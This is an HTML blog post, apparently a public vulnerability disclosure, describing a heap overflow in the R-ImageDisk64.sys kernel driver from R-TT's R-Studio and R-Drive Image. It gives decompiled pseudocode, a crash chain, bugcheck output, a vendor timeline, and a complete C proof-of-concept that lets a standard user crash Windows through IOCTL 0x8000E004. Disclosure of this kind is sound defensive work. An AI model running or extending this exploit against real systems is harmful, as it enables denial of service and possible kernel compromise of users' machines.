@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>R-ImageDisk64.sys — Heap Overflow — Geb0_X</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:      #0d0f12;
+    --bg2:     #141820;
+    --border:  #1e2430;
+    --dim:     #2e3850;
+    --muted:   #5a6a80;
+    --body:    #a0aab8;
+    --bright:  #d0dae8;
+    --white:   #eef2f8;
+    --neon:    #00d4ff;
+    --neon2:   #00ff9d;
+    --red:     #ff4466;
+    --yellow:  #ffcc44;
+    --ndim:    rgba(0,212,255,0.12);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html, body {
+    background: var(--bg);
+    color: var(--body);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    line-height: 1.8;
+    min-height: 100vh;
+  }
+
+  ::selection { background: var(--ndim); color: var(--neon); }
+
+  .wrap { max-width: 860px; margin: 0 auto; padding: 40px 24px 100px; }
+
+  /* NAV */
+  .topnav {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 40px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .back {
+    font-size: 12px;
+    color: var(--muted);
+    text-decoration: none;
+    transition: color 0.15s;
+  }
+  .back::before { content: '← '; }
+  .back:hover { color: var(--neon); }
+
+  .site { font-size: 13px; color: var(--bright); text-decoration: none; font-weight: 500; }
+
+  /* DIVIDER */
+  .div {
+    font-size: 11px;
+    color: var(--dim);
+    letter-spacing: -0.3px;
+    white-space: nowrap;
+    overflow: hidden;
+    margin: 32px 0 20px;
+    line-height: 1;
+  }
+  .div .lbl { color: var(--neon); letter-spacing: 2px; text-transform: uppercase; padding: 0 6px; font-size: 10px; }
+
+  /* POST HEADER */
+  .post-date { font-size: 11px; color: var(--muted); margin-bottom: 12px; letter-spacing: 1px; }
+
+  .post-title {
+    font-size: 18px;
+    font-weight: 500;
+    color: var(--white);
+    line-height: 1.4;
+    margin-bottom: 16px;
+    letter-spacing: -0.3px;
+  }
+
+
+  /* META TABLE */
+  .meta {
+    width: 100%;
+    border-collapse: collapse;
+    margin-bottom: 32px;
+    font-size: 12px;
+    border: 1px solid var(--border);
+  }
+  .meta td {
+    padding: 7px 12px;
+    border-bottom: 1px solid var(--border);
+    vertical-align: top;
+  }
+  .meta td:first-child { color: var(--muted); width: 160px; white-space: nowrap; }
+  .meta td:last-child { color: var(--bright); }
+  .meta .acc { color: var(--neon); }
+  .meta .warn { color: var(--yellow); }
+
+  /* CONTENT */
+  h2 {
+    font-size: 11px;
+    font-weight: 400;
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    color: var(--neon);
+    margin: 40px 0 14px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  h3 {
+    font-size: 12px;
+    font-weight: 500;
+    color: var(--bright);
+    margin: 24px 0 10px;
+  }
+  h3::before { content: '> '; color: var(--neon); }
+
+  p { font-size: 12px; color: var(--body); margin-bottom: 14px; line-height: 1.85; }
+
+  a { color: var(--neon); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    color: var(--neon);
+    padding: 1px 5px;
+  }
+
+  pre {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 2px solid var(--neon);
+    padding: 16px 18px;
+    margin: 14px 0 24px;
+    overflow-x: auto;
+    font-size: 12px;
+    line-height: 1.7;
+  }
+
+  pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    color: var(--body);
+    font-size: 12px;
+  }
+
+  .cm  { color: #3a4a5a; }
+  .kw  { color: var(--yellow); }
+  .fn  { color: var(--neon); }
+  .str { color: var(--neon2); }
+  .num { color: #d19a66; }
+  .err { color: var(--red); font-weight: 500; }
+
+  ul { margin: 0 0 16px 0; padding-left: 20px; }
+  ul li { font-size: 12px; color: var(--body); line-height: 1.85; margin-bottom: 3px; }
+  ul li::marker { color: var(--neon); }
+
+  /* NOTE */
+  .note {
+    background: var(--bg2);
+    border-left: 2px solid var(--dim);
+    padding: 12px 16px;
+    margin: 14px 0 24px;
+    font-size: 11px;
+    color: var(--muted);
+    line-height: 1.75;
+  }
+
+  /* CRASH CHAIN SVG */
+  .chain-wrap { margin: 16px 0 28px; }
+
+  /* SCREENSHOT */
+  .shot { margin: 20px 0 28px; }
+  .shot img { width: 100%; border: 1px solid var(--border); display: block; }
+  .shot .cap { font-size: 10px; color: var(--dim); margin-top: 6px; letter-spacing: 0.5px; }
+
+  /* VIDEO */
+  .vid { margin: 20px 0 28px; border: 1px solid var(--border); background: #000; }
+  .vid video { width: 100%; display: block; }
+  .vid .cap { font-size: 10px; color: var(--dim); padding: 8px 12px; border-top: 1px solid var(--border); }
+
+  /* TIMELINE */
+  .tl { margin: 14px 0 24px; }
+  .tl-row {
+    display: flex;
+    gap: 20px;
+    padding: 8px 0;
+    border-bottom: 1px solid var(--border);
+    font-size: 12px;
+  }
+  .tl-row:first-child { border-top: 1px solid var(--border); }
+  .tl-date { color: var(--muted); white-space: nowrap; width: 100px; flex-shrink: 0; }
+
+  /* FOOTER */
+  .foot {
+    margin-top: 72px;
+    padding-top: 20px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    justify-content: space-between;
+    font-size: 11px;
+    color: var(--dim);
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- NAV -->
+  <div class="topnav">
+    <a href="index.html" class="back">all posts</a>
+    <a href="index.html" class="site">Geb0_X</a>
+  </div>
+
+  <!-- HEADER -->
+  <div class="post-date">2026-04-23</div>
+  <div class="post-title">R-ImageDisk64.sys — Heap Overflow Leading to Kernel Stack Corruption</div>
+
+
+  <!-- META TABLE -->
+  <table class="meta">
+    <tr><td>Product</td>       <td><span class="acc">R-Studio / R-Drive Image</span></td></tr>
+    <tr><td>Driver</td>        <td>R-ImageDisk64.sys</td></tr>
+    <tr><td>Version</td>       <td>00.00.0018 (compiled 2014-10-10)</td></tr>
+    <tr><td>Vendor</td>        <td>R-TT Inc. — <a href="mailto:office@r-tt.com">office@r-tt.com</a></td></tr>
+    <tr><td>Platforms</td>     <td>Windows 10 (all builds), Windows 11 &lt; 22H2</td></tr>
+    <tr><td>Impact</td>        <td><span class="warn">DoS confirmed — kernel memory corruption, RIP control demonstrated</span></td></tr>
+    <tr><td>CVSS 3.1</td>      <td><span class="acc">7.8</span> — AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</td></tr>
+    <tr><td>Disclosed</td>     <td>2026-04-23</td></tr>
+  </table>
+
+  <!-- BACKGROUND -->
+  <div class="div" id="d1"></div>
+  <h2>Background</h2>
+
+  <p>
+    R-ImageDisk64.sys is a kernel driver shipped with R-Studio and R-Drive Image —
+    data recovery and disk imaging tools by R-TT Inc. The driver provides virtual disk
+    functionality, mounting raw disk images as virtual drives.
+  </p>
+  <p>
+    The driver was compiled in 2014 targeting Windows NT 4.0 era APIs. It carries no
+    modern mitigations — no ASLR, DEP, or CFG — and uses the deprecated
+    <code>ExAllocatePool</code> API which was removed entirely in Windows 11 22H2.
+    Analysis was performed using IDA Pro (static) and WinDbg (dynamic) on Windows 10
+    x64 Build 19045 in an isolated VMware environment. Driver was loaded via
+    OSR Driver Loader for testing.
+  </p>
+
+  <!-- DEVICE ACCESS -->
+  <h2>Device Access</h2>
+
+  <p>
+    Upon mounting a disk image through R-Studio, the driver registers child devices
+    using <code>IoCreateUnprotectedSymbolicLink</code> — no security descriptor is
+    applied. Any local user without administrator rights can open:
+  </p>
+
+  <pre><code>\\.\GLOBALROOT\Device\R-ImageDisk\R-ImageDiskCd0
+\\.\GLOBALROOT\Device\R-ImageDisk\R-ImageDisk0</code></pre>
+
+  <!-- SCREENSHOT: WinObj -->
+  <div class="shot">
+    <img src="img/winobj-devices.png" alt="WinObj — R-ImageDisk devices">
+    <div class="cap">Fig. 1 — WinObj: \Device\R-ImageDisk\ listing</div>
+  </div>
+
+  <!-- SCREENSHOT: OSR Loader -->
+  <div class="shot">
+    <img src="img/osr-loader.png" alt="OSR Driver Loader">
+    <div class="cap">Fig. 2 — OSR Driver Loader: driver loaded and running</div>
+  </div>
+
+  <!-- VULNERABILITY ANALYSIS -->
+  <h2>Vulnerability Analysis</h2>
+
+  <h3>1. Missing ProbeForRead on UserBuffer</h3>
+
+  <p>
+    IOCTL <code>0x8000E004</code> uses <code>METHOD_NEITHER</code> —
+    <code>IRP-&gt;UserBuffer</code> is a raw userspace pointer.
+    The kernel requirement is to call <code>ProbeForRead</code> before access.
+    This call is absent. The handler reads directly from <code>UserBuffer</code>
+    without any validation.
+  </p>
+  <p>
+    Confirmed dynamically: sending a buffer with a valid path at offset +17
+    returned <code>ok=1</code>, proving the driver read our userspace memory
+    and attempted to open the path.
+  </p>
+
+  <h3>2. Heap Overflow via Integer Calculation</h3>
+
+  <p>
+    The IOCTL handler computes allocation and copy sizes from attacker-controlled
+    data at <code>UserBuffer+15</code> without any bounds check:
+  </p>
+
+  <pre><code><span class="cm">// UserBuffer[15] is a WORD — no ProbeForRead, no bounds check</span>
+alloc_size = 2 * *(WORD*)(UserBuffer + 15) + 2;
+copy_size  = 2 * *(WORD*)(UserBuffer + 15);
+
+pool_buf = <span class="fn">ExAllocatePool</span>(NonPagedPool, alloc_size);
+<span class="fn">qmemcpy</span>(pool_buf, UserBuffer + 17, copy_size); <span class="err">// ← overflow</span></code></pre>
+
+  <p>With <code>UserBuffer[15] = 0x8000</code>:</p>
+
+  <pre><code>alloc_size = <span class="num">0x10002</span>  (allocated in NonPagedPool)
+copy_size  = <span class="num">0x10000</span>  (copied from UserBuffer+17)
+overflow   = <span class="err">0xFFFE bytes past the end of the allocated block</span></code></pre>
+
+  <!-- SCREENSHOT: IDA sub_40650 -->
+  <div class="shot">
+    <img src="img/ida-ioctl-handler.png" alt="IDA Pro — IOCTL handler pseudocode">
+    <div class="cap">Fig. 3 — IDA Pro: IOCTL handler showing qmemcpy with attacker-controlled size</div>
+  </div>
+
+  <h3>3. Unbounded String Read</h3>
+
+  <p>
+    The path string from <code>UserBuffer</code> is passed to a length computation
+    routine using an unbounded loop with no maximum length check:
+  </p>
+
+  <pre><code>unsigned __int16 *v3 = a1;  <span class="cm">// a1 = UserBuffer path — no ProbeForRead</span>
+<span class="kw">while</span> ( *v3++ )             <span class="err">// ← reads past buffer if no null terminator</span>
+    ;
+<span class="kw">return</span> v3 - a1 - 1;</code></pre>
+
+  <p>
+    If the buffer contains no null terminator <code>0x0000</code>, the loop reads
+    indefinitely into kernel memory — out-of-bounds read.
+  </p>
+
+  <!-- SCREENSHOT: IDA unbounded loop -->
+  <div class="shot">
+    <img src="img/ida-strlen-loop.png" alt="IDA Pro — unbounded while loop">
+    <div class="cap">Fig. 4 — IDA Pro: unbounded while(*v3++) — no length limit</div>
+  </div>
+
+  <!-- ADDITIONAL ISSUES -->
+  <h2>Additional Issues</h2>
+
+  <ul>
+    <li><code>ExAllocatePool</code> without pool tag ×3 — undefined behavior, incompatible with Windows 11 22H2+ (API removed)</li>
+    <li><code>swprintf</code> without explicit length bound — potential stack buffer overrun</li>
+    <li><code>IoCreateUnprotectedSymbolicLink</code> — device accessible to any local user</li>
+    <li>No ASLR, DEP, or CFG mitigations — binary targets NT 4.0 ABI</li>
+  </ul>
+
+  <!-- CRASH CHAIN -->
+  <h2>Crash Chain</h2>
+
+  <div class="chain-wrap">
+    <svg viewBox="0 0 800 540" xmlns="http://www.w3.org/2000/svg" style="width:100%;font-family:'JetBrains Mono',monospace;">
+      <defs>
+        <marker id="arr" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="#2e3850"/>
+        </marker>
+        <marker id="arr-red" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="#ff4466"/>
+        </marker>
+      </defs>
+
+      <!-- Step 1 -->
+      <rect x="100" y="10" width="600" height="50" rx="3" fill="#141820" stroke="#00d4ff" stroke-width="1"/>
+      <text x="400" y="30" text-anchor="middle" fill="#00d4ff" font-size="11">IOCTL 0x8000E004  (METHOD_NEITHER)</text>
+      <text x="400" y="50" text-anchor="middle" fill="#5a6a80" font-size="10">DeviceIoControl from low-privileged user</text>
+
+      <line x1="400" y1="60" x2="400" y2="84" stroke="#2e3850" stroke-width="1.5" marker-end="url(#arr)"/>
+
+      <!-- Step 2 -->
+      <rect x="100" y="86" width="600" height="50" rx="3" fill="#141820" stroke="#ffcc44" stroke-width="1"/>
+      <text x="400" y="106" text-anchor="middle" fill="#ffcc44" font-size="11">IRP-&gt;UserBuffer accessed without ProbeForRead</text>
+      <text x="400" y="126" text-anchor="middle" fill="#5a6a80" font-size="10">raw userspace pointer trusted directly by kernel</text>
+
+      <line x1="400" y1="136" x2="400" y2="160" stroke="#2e3850" stroke-width="1.5" marker-end="url(#arr)"/>
+
+      <!-- Step 3 -->
+      <rect x="100" y="162" width="600" height="62" rx="3" fill="#1a0d12" stroke="#ff4466" stroke-width="1.5"/>
+      <text x="400" y="184" text-anchor="middle" fill="#ff4466" font-size="11">qmemcpy(NonPagedPool, UserBuffer+17, 0x10000)</text>
+      <text x="400" y="204" text-anchor="middle" fill="#a0aab8" font-size="10">alloc = 0x10002 bytes  |  copy = 0x10000 bytes</text>
+      <text x="400" y="220" text-anchor="middle" fill="#ff4466" font-size="10">overflow = 0xFFFE bytes past allocated block</text>
+
+      <line x1="400" y1="224" x2="400" y2="248" stroke="#2e3850" stroke-width="1.5" marker-end="url(#arr)"/>
+
+      <!-- Step 4 -->
+      <rect x="100" y="250" width="600" height="50" rx="3" fill="#141820" stroke="#ffcc44" stroke-width="1"/>
+      <text x="400" y="270" text-anchor="middle" fill="#ffcc44" font-size="11">NonPagedPool corruption</text>
+      <text x="400" y="290" text-anchor="middle" fill="#5a6a80" font-size="10">adjacent kernel structures overwritten</text>
+
+      <line x1="400" y1="300" x2="400" y2="324" stroke="#2e3850" stroke-width="1.5" marker-end="url(#arr)"/>
+
+      <!-- Step 5 -->
+      <rect x="100" y="326" width="600" height="50" rx="3" fill="#141820" stroke="#ffcc44" stroke-width="1"/>
+      <text x="400" y="346" text-anchor="middle" fill="#ffcc44" font-size="11">downstream routine — stack return address corrupted</text>
+      <text x="400" y="366" text-anchor="middle" fill="#5a6a80" font-size="10">RIP = attacker-controlled value from UserBuffer</text>
+
+      <line x1="400" y1="376" x2="400" y2="400" stroke="#ff4466" stroke-width="1.5" marker-end="url(#arr-red)"/>
+
+      <!-- Step 6: BSOD -->
+      <rect x="100" y="402" width="600" height="62" rx="3" fill="#1a0d12" stroke="#ff4466" stroke-width="2"/>
+      <text x="400" y="424" text-anchor="middle" fill="#ff4466" font-size="12" font-weight="500">retn  at  R-ImageDisk64.sys+0x30901</text>
+      <text x="400" y="444" text-anchor="middle" fill="#ff4466" font-size="11">PAGE_FAULT_IN_NONPAGED_AREA</text>
+      <text x="400" y="462" text-anchor="middle" fill="#5a6a80" font-size="10">BugCheck 0x50  —  param2 = EXECUTE</text>
+    </svg>
+  </div>
+
+  <!-- POC -->
+  <h2>Proof of Concept</h2>
+
+  <p>
+    Tested on Windows 10 x64 Build 19045. Executed as a standard user.
+    Requires a disk image to be mounted via R-Studio first.
+  </p>
+
+  <pre><code><span class="cm">/*
+ * R-ImageDisk64.sys — Heap Overflow PoC
+ * Triggers: PAGE_FAULT_IN_NONPAGED_AREA (BugCheck 0x50)
+ * At:       R-ImageDisk64.sys+0x30901 (retn)
+ */</span>
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+#define TARGET  L<span class="str">"\\\\.\\GLOBALROOT\\Device\\R-ImageDisk\\R-ImageDiskCd0"</span>
+#define IOCTL   <span class="num">0x8000E004</span>
+
+<span class="kw">int</span> <span class="fn">main</span>() {
+    HANDLE h = <span class="fn">CreateFileW</span>(TARGET,
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL, OPEN_EXISTING, 0, NULL);
+
+    <span class="kw">if</span> (h == INVALID_HANDLE_VALUE) { <span class="kw">return</span> 1; }
+
+    DWORD bufSize = <span class="num">0x10024</span>;
+    PBYTE buf = <span class="fn">VirtualAlloc</span>(NULL, bufSize, MEM_COMMIT, PAGE_READWRITE);
+    <span class="fn">memset</span>(buf, 0, bufSize);
+
+    <span class="cm">// trigger: alloc=0x10002, copy=0x10000 → overflow 0xFFFE bytes</span>
+    *((WORD*)(buf + <span class="num">15</span>)) = <span class="num">0x8000</span>;
+
+    <span class="cm">// valid null-terminated path to pass length routine</span>
+    wchar_t *p = (wchar_t*)(buf + <span class="num">17</span>);
+    p[0]=L<span class="str">'C'</span>; p[1]=L<span class="str">':'</span>; p[2]=L<span class="str">'\\'</span>; p[3]=0;
+
+    <span class="cm">// fill with pattern for minidump identification</span>
+    <span class="kw">for</span> (DWORD i = <span class="num">25</span>; i &lt; bufSize - 8; i += 8)
+        <span class="fn">memcpy</span>(buf + i, <span class="str">"OVERFLOW"</span>, 8);
+
+    DWORD ret = 0;
+    <span class="fn">DeviceIoControl</span>(h, IOCTL, buf, bufSize, NULL, 0, &amp;ret, NULL);
+
+    <span class="fn">VirtualFree</span>(buf, 0, MEM_RELEASE);
+    <span class="fn">CloseHandle</span>(h);
+    <span class="kw">return</span> 0;
+}</code></pre>
+
+  <!-- DYNAMIC CONFIRMATION -->
+  <h2>Dynamic Confirmation</h2>
+
+  <!-- SCREENSHOT: PoC output -->
+  <div class="shot">
+    <img src="img/poc-output.png" alt="PoC output in CMD">
+    <div class="cap">Fig. 5 — PoC output: ok=1 confirms UserBuffer read without ProbeForRead</div>
+  </div>
+
+  <p>Running the PoC produced the following BugCheck:</p>
+
+  <pre><code>BugCheck  : 0x00000050 (PAGE_FAULT_IN_NONPAGED_AREA)
+param1    : 0xFFFFD60D88803000  (faulting address)
+param2    : <span class="err">0x0000000000000002  (EXECUTE attempt)</span>
+param3    : 0xFFFFF8078C7D0901  (faulting instruction)
+
+Module    : R-ImageDisk64.sys
+Offset    : <span class="err">+0x30901</span>
+Instruction: <span class="err">retn</span></code></pre>
+
+  <!-- SCREENSHOT: BSOD -->
+  <div class="shot">
+    <img src="img/bsod.png" alt="BSOD screenshot">
+    <div class="cap">Fig. 6 — System crash: PAGE_FAULT_IN_NONPAGED_AREA caused by R-ImageDisk64.sys</div>
+  </div>
+
+  <!-- SCREENSHOT: Event Viewer -->
+  <div class="shot">
+    <img src="img/eventviewer.png" alt="Event Viewer Kernel Power 41">
+    <div class="cap">Fig. 7 — Event Viewer: Kernel-Power Event 41 confirming unexpected shutdown</div>
+  </div>
+
+  <!-- VIDEO -->
+  <h2>Demonstration</h2>
+
+  <p>Full reproduction from standard user account — OSR Loader, disk image mount, single DeviceIoControl call.</p>
+
+  <div class="vid">
+    <video controls preload="metadata">
+      <source src="img/demo.mp4" type="video/mp4">
+    </video>
+    <div class="cap">Demo: low-privileged user → system crash</div>
+  </div>
+
+  <!-- TIMELINE -->
+  <h2>Disclosure Timeline</h2>
+
+  <div class="tl">
+    <div class="tl-row"><span class="tl-date">2026-03-24</span><span>Vulnerability discovered and confirmed via static + dynamic analysis</span></div>
+    <div class="tl-row"><span class="tl-date">2026-03-24</span><span>Vendor (R-TT Inc.) notified at office@r-tt.com — full technical report attached</span></div>
+    <div class="tl-row"><span class="tl-date">2026-03-29</span><span>Follow-up sent via forum.r-tt.com — no response received</span></div>
+    <div class="tl-row"><span class="tl-date">2026-04-23</span><span>Public disclosure — vendor did not respond to either contact attempt</span></div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="foot">
+    <span>© 2026 Geb0_X</span>
+    <a href="index.html">← back</a>
+  </div>
+
+</div>
+
+<script>
+function fillDiv(id) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  const w = el.parentElement.clientWidth;
+  const cw = 7.8;
+  const total = Math.floor(w / cw);
+  const label = el.dataset.label || '';
+  const pad = label ? `─── ${label} ` : '';
+  el.textContent = pad + '─'.repeat(Math.max(0, total - pad.length));
+}
+document.querySelectorAll('.div').forEach(el => {
+  el.dataset.label = el.textContent.trim();
+  el.textContent = '';
+  fillDiv(el.id);
+});
+window.addEventListener('resize', () => {
+  document.querySelectorAll('.div').forEach(el => fillDiv(el.id));
+});
+</script>
+</body>
+</html>
